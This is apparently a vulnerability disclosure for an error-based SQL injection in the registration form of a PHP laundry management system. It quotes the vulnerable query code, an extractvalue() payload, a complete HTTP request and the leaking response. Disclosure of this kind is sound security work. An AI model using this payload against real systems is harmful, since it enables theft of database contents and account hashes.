## SIMPLE_LAUNDRY_SYSTEM userfinishregister.php Error-Based SQL Injection Vulnerability

### I. Vulnerability Impact

The `email` parameter of the member registration handler `userfinishregister.php` is concatenated into an `INSERT` statement without any escaping, and the script prints the raw MySQL error message back to the client when the statement fails. An attacker can wrap any subquery in `extractvalue()` and read its result directly from the registration response, which allows the database name, table names and the account hashes stored in `member` and `staff` to be dumped without any valid credentials. The endpoint is a public registration form, so no authentication is required.

### II. Source Code Analysis

The vulnerability resides in `userfinishregister.php`, lines 32-50:

```php
$firstName = $_POST['firstName'];
$lastName = $_POST['lastName'];
$gender = $_POST['gender'];
$mobileNo = $_POST['mobileNo'];
$address = $_POST['address'];
$email = $_POST['email'];
$password= $_POST['password'];
$rePassword =$_POST['rePassword'];
$memberUserId = $_POST['userId'];

if($password==$rePassword){
    $password = md5($_POST["password"]);
    $q="INSERT INTO MEMBER (firstName,lastName,mobileNo,address,memberTypeId,bonusPoint,email,memberUserId,password,gender)
    VALUES ('$firstName','$lastName','$mobileNo','$address','1','0','$email','$memberUserId','$password','$gender')";
    $result=$mysqli->query($q);
    if(!$result){
        echo "INSERT failed. Error: ".$mysqli->error ;
```

Every value in the `VALUES` list is taken directly from `$_POST` and wrapped in single quotes inside the statement; none of them passes through `mysqli_real_escape_string()` and no prepared statement is used. A single quote in any of them closes its literal and the remainder is parsed as SQL. `$password` is the only parameter that is transformed (`md5()` on line 45), so it cannot carry the injection, which leaves `firstName`, `lastName`, `mobileNo`, `address`, `email`, `userId` and `gender` as injection points.

Line 50 echoes `$mysqli->error` into the page whenever the query fails, so any function that raises an error containing the result of an expression — `extractvalue()` being the classic choice — turns the registration form into a direct data extraction channel. Because the error branch neither breaks nor exits, execution continues to lines 53-54 and the page also prints `REGISTER DONE!`, which must not be mistaken for a successful registration.

The only precondition is the check on line 44: `password` and `rePassword` have to be equal, otherwise the `INSERT` is never reached and the page returns `Password does not match!`.

### III. Payload

The core injection payload is:

```
11@qq.com'and/**/extractvalue(1,concat(char(126),md5(1968248283)))and'
```

The resulting SQL statement executed by the server becomes:

```sql
INSERT INTO MEMBER (firstName,lastName,mobileNo,address,memberTypeId,bonusPoint,email,memberUserId,password,gender)
VALUES ('10','1','1','1','1','0','11@qq.com'and/**/extractvalue(1,concat(char(126),md5(1968248283)))and'','11','c4ca4238a0b923820dcc509a6f75849b','M')
```

The leading `11@qq.com'` closes the `email` literal, `/**/` is used as a whitespace substitute so the payload survives URL handling, `extractvalue()` receives a deliberately malformed XPath built from `char(126)` (`~`) concatenated with the value to be extracted, and the trailing `and'` re-balances the quote that the PHP template appends. MySQL evaluates the argument, then rejects the XPath and reports it inside the error message, so the evaluated value — here the MD5 of `1968248283` — appears in the response. The `password` and `rePassword` fields both carry `1` so that the comparison on line 44 passes and the query is actually reached.

```
POST /userfinishregister.php HTTP/1.1
Host: bbn
Content-Length: 190
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0
Origin: http://bbn
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bbn/userregister.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=spacqjha3aq8tcnnpfgfdvce3t
Connection: keep-alive

firstName=10&lastName=1&gender=M&mobileNo=1&address=1&email=11@qq.com'and/**/extractvalue(1,concat(char(126),md5(1968248283)))and'&userId=11&password=1&rePassword=1&userRegisterSubmit=Submit
```

The response echoes the evaluated expression inside the MySQL error message, which proves that the injected SQL was executed and that arbitrary query results can be read from the registration form:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Fri, 30 Oct 2026 09:03:30 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.3.4
Refresh: 2; url=usermanagement.php
Content-Length: 1841

<!DOCTYPE html>
<html>
<head>
<title>ITS351_PROJECT</title>
<link rel="stylesheet" type="text/css" href="stylesbackup1.css">
...
<body>
<div class="registerContent">
<div class="registerDiv">
INSERT failed. Error: XPATH syntax error: '~94356c93eafbe7e260d2b7b2c698254'<h1 style="text-align: center; font-family: monospace;">REGISTER DONE!.<h1>
</div>
</div>
```

### IV. Source Download

https://code-projects.org/simple-laundry-system-in-php-with-source-code/



![image-20261030170449615](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20261030170449615.png)
